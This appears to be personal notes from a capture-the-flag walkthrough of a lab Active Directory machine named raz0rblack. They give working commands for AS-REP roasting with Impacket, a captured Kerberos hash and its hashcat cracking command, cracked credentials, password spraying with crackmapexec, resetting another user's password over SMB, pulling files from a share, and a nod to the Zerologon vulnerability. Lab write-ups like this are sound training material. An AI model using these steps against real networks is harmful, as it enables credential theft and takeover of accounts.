
What is the zip file’s password?

Now we have a user list so let's try it against Kerberos. We will use IMPACKET’s GetNPUsers to brute force Kerebos and the Hash of an existing user from our User List.

GetNPUsers.py -no-pass raz0rblack.thm/ -usersfile users.txt -format hashcat -outputfile hashes.txt

GetNPUsers.py -dc-ip 10.10.150.260 -no-pass raz0rblack.thm/ -u user_list.txt -format hashcat -o hashes.txt

Add the machine IP address to the `/etc/hosts` file to continue this attack, Otherwise, you will not be able to use the Tool
![[Pasted image 20230919175726.png]]


Luckily we got a Kerberos Hash 
```
GetNPUsers.py -no-pass raz0rblack.thm/ -u user_list.txt -format hashcat -o hashes.txt 
```

```
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:c70996e93b9e4c373953a6a58a2451ce$c8cb917b6bf6c429c057a2f0d0984a3062ec4e4141d6e720701e2bde6821b33c2fec0001a18dbb9c3832efc0e8245914a60f9e41fa3e92b584b1552465696d46ceef7914095585ee48231ffe7d167239aef69dd79c72c0347eff2930c8db8e6e5c07ce352e3c0d255dec43dc8c436f550c660b044e892aa1c1ffdef7d958f38dffd8dc6ce6087eaf09b99632429bd322519aaddc2275134fcaab72a40388288bd7c02e14381a977f8fb639f9aa3e35d856da4e4a24a197c4408ddf34b6900c3678a79942160e49cc701edbbae62240b372273a555db14ced6128adabfca6a2606d263e8a03acf02cb8529143b34bbf4e
```

Let's Crack it see what the password 

```
hashcat --help | grep Kerberos
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```
As we know our Kerberos 5 and etype 23 

```
hashcat-6.2.6> .\hashcat.exe -m 18200 -a 0 -D 2 .\hashes4.txt .\rockyou.txt --show
```
![[Pasted image 20230919181040.png]]

Users:
```
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams roastpotatoes
sbradley
clin
```

User
```
twilliams
```
Password
```
roastpotatoes
```

So the 1st thing that come to my mind is Obviously SMB 

```
smbclient -L 10.10.13.82 -U twilliams@raz0rblack.thm 
```
![[Pasted image 20230919182646.png]]

My eyes are kinda set to open the trash 1st don't get me wrong here.


Meanwhile i run the crackmapexec in order to see that if any user has the same password or u can say that we can login another user using the same password but we can't 
![[Pasted image 20230919183129.png]]
But but but but but i think crackmapexec takes only first 10 users so i deleted someusers from the list
![[Pasted image 20230919184335.png]]

So let's reset the password for 
User : sbradely
oldPasswd: roastpotatoes
newPasswd : 

I have to work on my spell mistakes i was stuck for an hour to figure what was wrong
![[Pasted image 20230920120922.png]]
and now a error is at door step i need to get my foot in the door from time to time to get pass this error as well hahahahha.

![[Pasted image 20230920122323.png]]
I think there might be a passwd criteria so that is why i might not able to update the password

Yup i was right 
```
 smbpasswd.py -ts -newpass hackingakatesting raz0rblack.local/sbradley:roastpotatoes@10.10.43.122
```
![[Pasted image 20230920122454.png]]

Will run the Crackmapexec to check if the passwd is change or not
![[Pasted image 20230920122604.png]]
The passwords is changes that means we have 2 user and 2 passwords at our disposal

So let's try to access the trash folder and see if we can get something

```
User: sbradley
Passwd: hackingakatesting
```

```
smbclient \\\\10.10.155.35\\trash -U 'sbradley'
hackingakatesting
```

To download all the files from SMB to our local host
```
rompt off
recurse on
ls
mget *
```
![[Pasted image 20230920123215.png]]

When we open the chat it told us about the vulnerability but i am having seconds thoughts if we should run it or not.
new CVE-2020-1472
![[Pasted image 20230920123707.png]]

